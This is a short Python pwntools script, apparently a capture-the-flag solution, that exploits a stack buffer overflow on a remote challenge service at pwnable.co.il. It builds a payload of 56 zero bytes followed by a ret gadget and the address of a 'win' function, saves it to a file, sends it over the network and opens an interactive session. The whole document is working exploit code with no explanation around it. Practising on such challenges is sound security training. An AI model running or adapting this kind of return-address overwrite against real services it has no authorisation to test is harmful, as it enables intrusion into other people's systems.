from pwn import *
conn = remote('pwnable.co.il', 9009)

ret = p64(0x0000000000401479)
win = p64(0x00000000004012e5)

paylod = b'\x00' * 56 + ret + win 

with open("file", "wb") as file:
	file.write(paylod)

print(len(paylod))
conn.sendline(paylod)
conn.interactive()
